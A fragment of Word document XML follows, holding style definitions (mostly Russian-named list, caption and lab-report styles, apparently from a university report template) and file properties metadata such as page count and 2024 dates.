    <w:name w:val="Book Title"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="33"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00F67AC2"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af5">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="a8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2">
    <w:name w:val="Светлая заливка1"/>
    <w:basedOn w:val="a9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2">
    <w:name w:val="List Bullet 2"/>
    <w:basedOn w:val="a7"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00985035"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af6">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a7"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00F52F00"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="af7">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="a9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8">
    <w:name w:val="Рисунок"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="ad"/>
    <w:qFormat/>
    <w:rsid w:val="00BE19C9"/>
    <w:pPr>
      <w:keepNext/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af9">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="afa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fb">
    <w:name w:val="Введение_заключение"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00F52F00"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="afa">
    <w:name w:val="Текст выноски Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="af9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1">
    <w:name w:val="Список_ТИРЕ"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="8"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a0">
    <w:name w:val="Список_БУКВЫ"/>
    <w:basedOn w:val="a1"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="9"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a4">
    <w:name w:val="Список_ЦИФРЫ"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="10"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="20">
    <w:name w:val="Список_2_уровня"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="11"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a5">
    <w:name w:val="Список источников"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="afc">
    <w:name w:val="header"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="afd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8"/>
    <w:link w:val="afc"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00D60F71"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="afe">
    <w:name w:val="footer"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="aff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8"/>
    <w:link w:val="afe"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00D60F71"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="aff0">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="a7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ff1">
    <w:name w:val="_Название рисунка"/>
    <w:basedOn w:val="aff2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ff3">
    <w:name w:val="_Рисунок"/>
    <w:basedOn w:val="a7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2">
    <w:name w:val="_Маркированный2"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00917645"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="14"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="aff2">
    <w:name w:val="caption"/>
    <w:aliases w:val="Вставленный объект"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="aff4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f5">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:locked/>
    <w:rsid w:val="00917645"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="aff4">
    <w:name w:val="Название объекта Знак"/>
    <w:aliases w:val="Вставленный объект Знак"/>
    <w:link w:val="aff2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13">
    <w:name w:val="Основной текст Знак1"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="aff6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ff7">
    <w:name w:val="Основной текст + Курсив"/>
    <w:aliases w:val="Интервал 0 pt15"/>
    <w:basedOn w:val="13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aff6">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="13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ff8">
    <w:name w:val="Основной текст Знак"/>
    <w:basedOn w:val="a8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ff9">
    <w:name w:val="Подпись к картинке_"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="affa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fa">
    <w:name w:val="Подпись к картинке"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="aff9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13"/>
    <w:qFormat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1">
    <w:name w:val="Основной текст (6)_"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="62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2">
    <w:name w:val="Основной текст (6)"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="61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fb">
    <w:name w:val="Подпись к картинке + Курсив"/>
    <w:aliases w:val="Интервал 0 pt11"/>
    <w:basedOn w:val="aff9"/>
    <w:uiPriority w:val="99"/>
    <w:qFormat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character" w:styleId="affc">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="004A5302"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="affd">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="affe"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="004A5302"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="affe">
    <w:name w:val="Текст примечания Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="affd"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="004A5302"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20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locked/>
    <w:rsid w:val="004A5302"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="afff0">
    <w:name w:val="Тема примечания Знак"/>
    <w:basedOn w:val="affe"/>
    <w:link w:val="afff"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="004A5302"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a3">
    <w:name w:val="Подпись рисунка"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:rsid w:val="00456558"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="30"/>
      </w:numPr>
      <w:suppressAutoHyphens/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="afff1">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00374C59"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="afff2">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00374C59"/>
    <w:rPr>
      <w:color w:val="800080" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff3">
    <w:name w:val="Стиль Лабораторной"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="afff4"/>
    <w:qFormat/>
    <w:rsid w:val="002632D6"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="afff4">
    <w:name w:val="Стиль Лабораторной Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="afff3"/>
    <w:rsid w:val="002632D6"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff5">
    <w:name w:val="Тема лабораторной работы"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="004D6D91"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="0"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff6">
    <w:name w:val="МинОбрСПбПУ"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="004D6D91"/>
    <w:pPr>
      <w:ind w:right="567"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff7">
    <w:name w:val="Роспись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851" w:firstLine="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
      <w:i/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="41">
    <w:name w:val="Подпись4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567" w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
      <w:i/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a">
    <w:name w:val="Кто_я"/>
    <w:basedOn w:val="af6"/>
    <w:qFormat/>
    <w:rsid w:val="00111FF9"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="24"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="0"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="200" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="567" w:firstLine="0"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a6">
    <w:name w:val="Заголовок_пункта"/>
    <w:basedOn w:val="af6"/>
    <w:qFormat/>
    <w:rsid w:val="00111FF9"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="26"/>
      </w:numPr>
      <w:suppressAutoHyphens/>
      <w:ind w:firstLine="419"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff8">
    <w:name w:val="Заголовок_таблицы"/>
    <w:basedOn w:val="af0"/>
    <w:qFormat/>
    <w:rsid w:val="00111FF9"/>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff9">
    <w:name w:val="Название_таблицы"/>
    <w:basedOn w:val="aff2"/>
    <w:qFormat/>
    <w:rsid w:val="0030071C"/>
    <w:pPr>
      <w:keepNext/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afffa">
    <w:name w:val="Название_рисунка"/>
    <w:basedOn w:val="aff2"/>
    <w:qFormat/>
    <w:rsid w:val="0030071C"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="afffb">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="afffc"/>
    <w:uiPriority w:val="30"/>
    <w:locked/>
    <w:rsid w:val="00D335C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c">
    <w:name w:val="Выделенная цитата Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="afffb"/>
    <w:uiPriority w:val="30"/>
    <w:rsid w:val="00D335CB"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="4F81BD" w:themeColor="accent1"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afffd">
    <w:name w:val="АААААААААА"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00D335CB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="afffe">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:locked/>
    <w:rsid w:val="0057482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3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0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783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199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3038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nav\OneDrive\&#1044;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1099;\&#1053;&#1072;&#1089;&#1090;&#1088;&#1072;&#1080;&#1074;&#1072;&#1077;&#1084;&#1099;&#1077;%20&#1096;&#1072;&#1073;&#1083;&#1086;&#1085;&#1099;%20Office\report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89E52C-15FD-4335-8A49-57FD7BB9C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TotalTime>0</TotalTime>
  <Pages>36</Pages>
  <Words>3377</Words>
  <Characters>19255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2024-03-29T00:12:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-05-09T18:52:00Z</dcterms:modified>
</cp:coreProperties>
</file>